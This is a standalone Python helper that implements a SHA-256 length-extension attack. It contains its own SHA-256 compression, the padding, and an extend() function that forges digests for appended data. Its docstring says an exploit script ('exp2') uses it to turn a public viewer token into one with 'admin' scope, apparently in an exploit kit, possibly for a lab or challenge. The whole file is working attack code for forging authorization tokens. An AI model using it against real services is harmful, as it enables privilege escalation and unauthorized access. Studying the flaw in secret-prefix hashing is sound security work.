"""
Standalone SHA-256 length-extension helper. Reproduces the inner state of a
sha256 hash from its 32-byte digest, applies the proper padding, and lets the
caller append additional bytes. Used by exp2 to upgrade a public-actor viewer
token into one whose scope contains 'admin'.
"""
from __future__ import annotations

import struct
from typing import Iterable

_K = (
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1,
    0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,
    0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,
    0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,
    0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,
    0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
)


def _rotr(x: int, n: int) -> int:
    return ((x >> n) | (x << (32 - n))) & 0xffffffff


def _compress(state: list[int], block: bytes) -> list[int]:
    w = list(struct.unpack(">16I", block)) + [0] * 48
    for i in range(16, 64):
        s0 = _rotr(w[i - 15], 7) ^ _rotr(w[i - 15], 18) ^ (w[i - 15] >> 3)
        s1 = _rotr(w[i - 2], 17) ^ _rotr(w[i - 2], 19) ^ (w[i - 2] >> 10)
        w[i] = (w[i - 16] + s0 + w[i - 7] + s1) & 0xffffffff
    a, b, c, d, e, f, g, h = state
    for i in range(64):
        s1 = _rotr(e, 6) ^ _rotr(e, 11) ^ _rotr(e, 25)
        ch = (e & f) ^ ((~e & 0xffffffff) & g)
        temp1 = (h + s1 + ch + _K[i] + w[i]) & 0xffffffff
        s0 = _rotr(a, 2) ^ _rotr(a, 13) ^ _rotr(a, 22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        temp2 = (s0 + maj) & 0xffffffff
        h = g
        g = f
        f = e
        e = (d + temp1) & 0xffffffff
        d = c
        c = b
        b = a
        a = (temp1 + temp2) & 0xffffffff
    return [(s + v) & 0xffffffff for s, v in zip(state, [a, b, c, d, e, f, g, h])]


def md_padding(message_len_bytes: int) -> bytes:
    pad = b"\x80"
    pad += b"\x00" * ((56 - (message_len_bytes + 1) % 64) % 64)
    pad += struct.pack(">Q", message_len_bytes * 8)
    return pad


def extend(original_digest_hex: str, original_len: int, extension: bytes) -> tuple[bytes, str]:
    """Return (glue, new_digest_hex) for the extended message:
        secret || data || glue || extension
    where original_digest_hex is sha256(secret || data) and original_len is
    the byte length of (secret || data).
    """
    if len(original_digest_hex) != 64:
        raise ValueError("digest must be 64 hex chars")
    digest = bytes.fromhex(original_digest_hex)
    state = list(struct.unpack(">8I", digest))
    glue = md_padding(original_len)
    suffix = extension + md_padding(original_len + len(glue) + len(extension))
    for offset in range(0, len(suffix), 64):
        block = suffix[offset : offset + 64]
        if len(block) < 64:
            break
        state = _compress(state, block)
    return glue, struct.pack(">8I", *state).hex()


def iter_lengths(start: int = 8, stop: int = 96) -> Iterable[int]:
    return range(start, stop + 1)
